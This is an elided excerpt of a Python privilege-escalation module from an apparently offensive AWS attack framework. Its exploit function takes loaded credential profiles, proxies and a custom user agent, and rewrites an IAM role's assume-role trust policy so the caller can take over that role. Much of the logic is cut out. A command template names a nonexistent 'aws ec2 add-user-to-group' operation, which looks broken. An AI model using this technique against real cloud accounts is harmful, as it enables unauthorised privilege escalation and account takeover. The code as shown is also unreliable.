# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\privesc\aws_iam_modify_assume_role_policy.py
...
aws_command = (
    "aws ec2 add-user-to-group --user-name {} --group {} --region {} --profile {}"
)
...
def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
    ...
    if policydoc == "":
        stsProfile = giveMeClient(
            all_sessions, cred_prof, useragent, web_proxies, "sts"
        )
        try:
    ...
    iamProfile = giveMeClient(all_sessions, cred_prof, useragent, web_proxies, "iam")

    try:

        iamProfile.update_assume_role_policy(RoleName=role, PolicyDocument=policydoc)
        return {"AdditionStatus": f"Role {role} policy modified"}
    except Exception as e:
